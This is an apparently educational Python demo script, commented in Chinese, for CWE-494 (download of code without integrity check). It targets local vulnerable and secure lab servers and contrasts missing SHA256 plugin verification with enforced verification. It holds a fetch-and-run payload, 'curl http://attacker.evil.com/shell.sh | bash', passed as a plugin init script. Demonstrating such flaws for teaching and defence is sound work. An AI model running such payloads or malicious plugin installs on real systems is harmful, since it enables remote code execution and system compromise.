#!/usr/bin/env python3
"""
A08:2021 - Plugin Integrity Bypass
CWE-494: Download of Code Without Integrity Check

攻擊原理：
1. 漏洞版本安裝插件時不驗證 SHA256 hash
2. 攻擊者可以提供惡意插件 URL，系統會直接下載安裝
3. 安全版本要求提供 SHA256 hash 並驗證檔案完整性
"""

import requests
import json
import sys
import hashlib

# 目標 URL
VULNERABLE_URL = "http://localhost:8081"
SECURE_URL = "http://localhost:8082"

# 模擬惡意伺服器
MALICIOUS_SERVER = "http://attacker.evil.com"


def print_response(response):
    """格式化輸出回應"""
    print(f"Status: {response.status_code}")
    try:
        print(json.dumps(response.json(), indent=2, ensure_ascii=False))
    except:
        print(response.text[:500])


def calculate_sha256(content: str) -> str:
    """計算 SHA256 hash"""
    return hashlib.sha256(content.encode()).hexdigest()


def demo_malicious_plugin_vulnerable():
    """
    對漏洞版本進行惡意插件注入
    """
    print("\n" + "="*60)
    print("漏洞版本 - 惡意插件安裝 (CWE-494)")
    print("="*60)
    
    # 安裝惡意插件（不需要 hash 驗證）
    print("\n[1] 安裝惡意插件...")
    malicious_plugin = {
        "name": "backdoor-plugin",
        "url": f"{MALICIOUS_SERVER}/backdoor.jar",
        "version": "1.0.0",
        "description": "Totally legit plugin, trust me",
        "publisher": "TotallyNotAHacker"
    }
    
    response = requests.post(
        f"{VULNERABLE_URL}/api/integrity/plugins/install",
        json=malicious_plugin,
        timeout=10
    )
    print_response(response)
    
    if response.status_code == 200:
        print("\n[+] ✓ 惡意插件安裝成功！")
        print("[*] 系統未驗證插件來源或完整性")
    
    # 安裝帶有惡意初始化腳本的插件
    print("\n[2] 安裝帶有惡意腳本的插件...")
    script_plugin = {
        "name": "rce-plugin",
        "url": f"{MALICIOUS_SERVER}/rce-plugin.jar",
        "version": "2.0.0",
        "description": "Plugin with init script",
        "publisher": "Evil Corp",
        "initScript": "curl http://attacker.evil.com/shell.sh | bash"  # 惡意腳本
    }
    
    response = requests.post(
        f"{VULNERABLE_URL}/api/integrity/plugins/install",
        json=script_plugin,
        timeout=10
    )
    print_response(response)
    
    if response.status_code == 200:
        print("\n[+] ✓ 帶有惡意腳本的插件安裝成功！")
        print("[!] initScript 可能已被執行！")
    
    # 列出已安裝的插件
    print("\n[3] 列出已安裝的插件...")
    response = requests.get(f"{VULNERABLE_URL}/api/integrity/plugins", timeout=10)
    print_response(response)
    
    if response.status_code == 200:
        data = response.json()
        plugins = data.get("plugins", [])
        unverified = [p for p in plugins if not p.get("verified", False)]
        print(f"\n[*] 已安裝插件: {len(plugins)}")
        print(f"[!] 未驗證的插件: {len(unverified)}")


def demo_malicious_plugin_secure():
    """
    對安全版本進行惡意插件注入（應該失敗）
    """
    print("\n" + "="*60)
    print("安全版本 - SHA256 完整性驗證")
    print("="*60)
    
    # 嘗試不帶 hash 安裝插件
    print("\n[1] 嘗試不帶 SHA256 hash 安裝插件...")
    no_hash_plugin = {
        "name": "suspicious-plugin",
        "url": f"{MALICIOUS_SERVER}/suspicious.jar",
        "version": "1.0.0"
    }
    
    response = requests.post(
        f"{SECURE_URL}/api/integrity/plugins/install",
        json=no_hash_plugin,
        timeout=10
    )
    print_response(response)
    
    if response.status_code == 400:
        print("\n[+] ✓ 沒有 SHA256 hash 的插件被拒絕安裝！")
    
    # 嘗試提供錯誤的 hash
    print("\n[2] 嘗試提供錯誤的 SHA256 hash...")
    wrong_hash_plugin = {
        "name": "fake-plugin",
        "url": f"{MALICIOUS_SERVER}/fake.jar",
        "version": "1.0.0",
        "sha256Hash": "0000000000000000000000000000000000000000000000000000000000000000"
    }
    
    response = requests.post(
        f"{SECURE_URL}/api/integrity/plugins/install",
        json=wrong_hash_plugin,
        timeout=10
    )
    print_response(response)
    
    if response.status_code == 400:
        print("\n[+] ✓ Hash 不匹配的插件被拒絕安裝！")
    
    # 正確流程：使用正確的 hash
    print("\n[3] 正確流程：使用正確的 SHA256 hash...")
    
    # 模擬從官方來源取得的正確 hash
    plugin_url = "https://official-repo.example.com/payment-gateway-v2.0.0.jar"
    correct_hash = calculate_sha256(plugin_url)  # 模擬
    
    correct_plugin = {
        "name": "payment-gateway-v2",
        "url": plugin_url,
        "version": "2.0.0",
        "description": "Official Payment Gateway Plugin",
        "publisher": "Verified Publisher",
        "sha256Hash": correct_hash
    }
    
    response = requests.post(
        f"{SECURE_URL}/api/integrity/plugins/install",
        json=correct_plugin,
        timeout=10
    )
    print_response(response)
    
    if response.status_code == 200:
        print("\n[+] ✓ 驗證過的插件安裝成功")
    
    # 列出插件並顯示驗證狀態
    print("\n[4] 列出插件及驗證狀態...")
    response = requests.get(f"{SECURE_URL}/api/integrity/plugins", timeout=10)
    print_response(response)


def demo_supply_chain_attack():
    """
    模擬供應鏈攻擊情境
    """
    print("\n" + "="*60)
    print("供應鏈攻擊情境模擬")
    print("="*60)
    
    print("""
[*] 攻擊情境說明：

1. 攻擊者入侵了一個熱門的第三方插件倉庫
2. 攻擊者用惡意版本替換了正常插件
3. 系統管理員從該倉庫安裝插件

--- 漏洞版本 ---
- 直接下載並安裝，不檢查完整性
- 惡意程式碼被執行
- 整個系統被入侵

--- 安全版本 ---
- 要求提供官方公布的 SHA256 hash
- 下載後計算檔案 hash 並比對
- Hash 不匹配，拒絕安裝
- 系統安全！

[*] 最佳實踐：
1. 始終從官方來源取得軟體
2. 驗證下載檔案的數位簽章或 hash
3. 使用可信的套件管理器
4. 定期檢查已安裝套件的完整性
5. 監控異常的網路活動
    """)
    
    # 演示自動更新的風險
    print("\n[5] 自動更新風險演示...")
    
    auto_update_plugin = {
        "name": "auto-updater",
        "url": f"{MALICIOUS_SERVER}/auto-updater.jar",
        "version": "latest",  # 使用 'latest' 標籤
        "description": "Always get the latest version!",
        "publisher": "Unknown"
    }
    
    print("\n[!] 漏洞版本嘗試安裝 'latest' 版本插件...")
    response = requests.post(
        f"{VULNERABLE_URL}/api/integrity/plugins/install",
        json=auto_update_plugin,
        timeout=10
    )
    
    if response.status_code == 200:
        print("[!] 危險！使用 'latest' 標籤可能導致：")
        print("    - 無法驗證特定版本的完整性")
        print("    - 自動取得被篡改的版本")
        print("    - 供應鏈攻擊")


def main():
    """主函數"""
    print("""
╔═══════════════════════════════════════════════════════════════╗
║  A08:2021 - Plugin Integrity Bypass                          ║
║  CWE-494: Download of Code Without Integrity Check           ║
╠═══════════════════════════════════════════════════════════════╣
║  攻擊方式：安裝未經驗證的惡意插件                            ║
║  防禦方式：SHA256 hash 驗證確保下載檔案完整性                ║
╚═══════════════════════════════════════════════════════════════╝
    """)
    
    if len(sys.argv) > 1:
        target = sys.argv[1]
        if target == "vulnerable":
            demo_malicious_plugin_vulnerable()
        elif target == "secure":
            demo_malicious_plugin_secure()
        elif target == "supply-chain":
            demo_supply_chain_attack()
        elif target == "both":
            demo_malicious_plugin_vulnerable()
            demo_malicious_plugin_secure()
        else:
            print(f"用法: {sys.argv[0]} [vulnerable|secure|supply-chain|both]")
    else:
        demo_malicious_plugin_vulnerable()
        print("\n" + "-"*60 + "\n")
        demo_malicious_plugin_secure()
        print("\n" + "-"*60 + "\n")
        demo_supply_chain_attack()
    
    print("\n[*] 演示完成")


if __name__ == "__main__":
    main()
